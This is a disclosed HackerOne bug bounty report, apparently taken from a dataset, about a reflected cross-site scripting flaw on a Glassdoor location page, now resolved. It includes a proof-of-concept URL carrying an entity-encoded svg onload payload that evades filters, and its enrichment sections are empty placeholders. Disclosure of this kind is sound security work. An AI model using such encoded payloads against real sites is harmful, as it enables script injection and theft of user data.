---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1695989'
original_report_id: '1695989'
title: XSS in www.glassdoor.com
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: glassdoor
created_at: '2022-09-09T12:15:47.052Z'
disclosed_at: '2022-09-16T20:10:14.969Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 21
asset_identifier: https://www.glassdoor.com/*
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS in www.glassdoor.com

## Metadata

- HackerOne Report ID: 1695989
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: glassdoor
- Disclosed At: 2022-09-16T20:10:14.969Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Browser: Chrome
Affected URL https://www.glassdoor.com/Location/All-Tesla-Office-Locations-E43129.htm?DIFFICULT=%3E%3Csvg%20onload%3d%26%23x00000000061;%26%23x0000000006c%26%23x0000000065%26%23x0000000072%26%23x00000000074(1%26%230000000000000041;%20%3C%2fscript%20

## Steps To Reproduce:
  1. Go to the affected URL

## Supporting Material/References:
Attached an image ███

## Impact

Leaking users data and and modify the webpage.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
